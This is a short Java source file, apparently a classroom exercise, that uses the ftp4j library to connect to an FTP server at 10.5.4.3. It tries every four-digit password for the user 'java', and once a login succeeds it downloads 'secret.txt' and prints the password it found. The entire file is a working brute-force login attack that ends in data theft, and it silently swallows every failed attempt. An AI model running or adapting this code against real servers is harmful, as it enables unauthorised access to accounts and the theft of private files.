import java.io.File;

import it.sauronsoftware.ftp4j.FTPClient;

public class Exam03 {

	public static void main(String[] args) throws Exception {
		// TODO Auto-generated method stub

		// FTP : 파일전송규약

		FTPClient client = new FTPClient();

		client.connect("10.5.4.3", 21);

		for(int i=0; i<=9999; i++) {
			String password = String.format("%04d", i);

			try {
				client.login("java", password);
				client.download("secret.txt", new File("D:/downloads/secret.txt"));
				System.out.println(password);
				break;

			} catch (Exception e) {

			}

		}
		client.disconnect(true);
	} 
}

